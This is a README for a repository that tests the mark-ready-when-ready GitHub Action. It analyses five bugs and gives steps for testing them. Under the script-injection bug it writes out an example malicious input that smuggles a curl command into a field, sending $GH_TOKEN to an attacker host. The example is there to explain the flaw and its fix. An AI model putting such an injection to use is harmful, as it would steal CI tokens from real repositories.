# test-mark-ready-when-ready

Test repository for evaluating the [kenyonj/mark-ready-when-ready](https://github.com/kenyonj/mark-ready-when-ready) GitHub Action.

## Bug Analysis

### Bug 1: Fork PR GraphQL Query Targets Wrong Repository (Critical)

The GraphQL verification step queries using `PR_HEAD_USER` and `PR_HEAD_REPO`:

```graphql
repository(owner: "$PR_HEAD_USER", name: "$PR_HEAD_REPO") {
  pullRequest(number: $PR_NUMBER) { ... }
}
```

For forked PRs, the PR number belongs to the **base** repository, not the fork. This query would return null/error for fork-based PRs because `pullRequest(number: N)` doesn't exist in the fork. Should use `github.repository_owner` and the base repo name instead.

### Bug 2: Multiline Output Truncation (Medium)

When multiple required checks fail, `failing_suites` and `failing_statuses` can be multiline. The code writes them with:

```bash
echo "failing_required_check_suites=$failing_suites" >> $GITHUB_OUTPUT
```

GitHub Actions single-line `echo "key=value"` syntax only captures the first line. Subsequent lines become malformed entries. Should use heredoc syntax:

```bash
{
  echo "failing_required_check_suites<<EOF"
  echo "$failing_suites"
  echo "EOF"
} >> $GITHUB_OUTPUT
```

### Bug 3: Script Injection via `pause-seconds` Input (Medium)

The pause step directly interpolates the input into a `run` block:

```yaml
run: sleep ${{ inputs.pause-seconds }}
```

A malicious value like `1; curl attacker.com/steal?token=$GH_TOKEN` would execute. Should pass as an environment variable instead:

```yaml
env:
  PAUSE_SECONDS: ${{ inputs.pause-seconds }}
run: sleep "$PAUSE_SECONDS"
```

### Bug 4: No Draft/Label Precondition Validation

The action itself doesn't verify the PR is a draft or has the trigger label. It relies entirely on the calling workflow's `if` condition. If someone invokes the action without those guards, it would attempt to mark an already-ready PR as ready (which may error or no-op depending on `gh` version).

### Bug 5: checkRuns Pagination Gap

The inner `checkRuns` query uses `first: 100` but doesn't paginate. If a single check suite has more than 100 check runs, some failing checks could be missed, leading to a false-green verification.

## Testing

### How to test

1. Create a branch and open a draft PR
2. Add the "Mark Ready When Ready" label
3. Observe the CI workflow and the mark-ready workflow

```bash
git checkout -b test-branch
echo "test" > test.txt
git add test.txt
git commit -m "test: add test file"
git push origin test-branch
gh pr create --draft --title "test: verify mark-ready-when-ready action" --body "Testing the action"
gh pr edit --add-label "Mark Ready When Ready"
```
